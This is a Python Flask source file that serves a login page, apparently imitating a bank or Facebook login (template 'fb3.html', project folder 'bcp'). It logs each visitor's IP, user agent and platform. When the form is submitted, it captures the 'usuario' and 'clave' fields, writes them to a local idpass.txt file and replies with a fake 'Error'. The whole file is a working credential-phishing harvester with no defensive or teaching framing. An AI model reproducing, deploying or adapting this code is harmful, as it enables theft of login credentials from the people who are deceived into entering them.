from flask import Flask, render_template, request
import traceback
from datetime import datetime

app = Flask(__name__)


# Define a dictionary to map IP addresses to placeholders
ip_mapping = {
    "127.0.0.1": "Localhost",


    # Add more mappings as needed
}

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == "GET":

        ip_address = request.remote_addr
        user_agent = request.user_agent.string
        device = request.user_agent.platform
        date = datetime.now()

        print(f"Date and Time: {date}")  # Print current date and time
        print(ip_address)
        # Use the mapped value if available, otherwise use the actual IP address
        ip_display = ip_mapping.get(ip_address, ip_address)
        print(f"IP: {ip_display}")
        print(f"user: {user_agent}")
        print(f"device: {device}")


    if request.method == 'POST':
        try:
            date = datetime.now()
            print(f"Date and Time: {date}")
            ip_address = request.remote_addr
            user_agent = request.user_agent.string
            device = request.user_agent.platform
            # Get IP address and other details

            usuario = request.form['usuario']
            clave = request.form['clave']

            print("Usuario:", usuario)
            print("Clave:", clave)

            # Use the mapped value if available, otherwise use the actual IP address
            ip_display = ip_mapping.get(ip_address, ip_address)
            file_path = r'C:\Users\Asus\PycharmProjects\bcp\idpass.txt'
            print(file_path)
            with open(file_path, 'a') as file:
                file.write(f'Date: {date}\n')
                file.write(f'Device: {device}\n')
                file.write(f'User Agent: {user_agent}\n')
                file.write(f'Usuario: {usuario}\nClave: {clave}\n********************************\n')
            return "Error"  # Return a response indicating success
        except Exception as e:
            traceback.print_exc()  # Print traceback to debug the exception
            pass
    return render_template('fb3.html')

crt = r"C:\Users\Asus\PycharmProjects\cert\fff.crt"
key = r"C:\Users\Asus\PycharmProjects\cert\private_key.pem"
if __name__ == '__main__':
    # Replace 'certificate.crt' and 'private.key' with the actual paths to your certificate and private key files
    app.run(host='0.0.0.0', port=80, ssl_context=(crt, key))
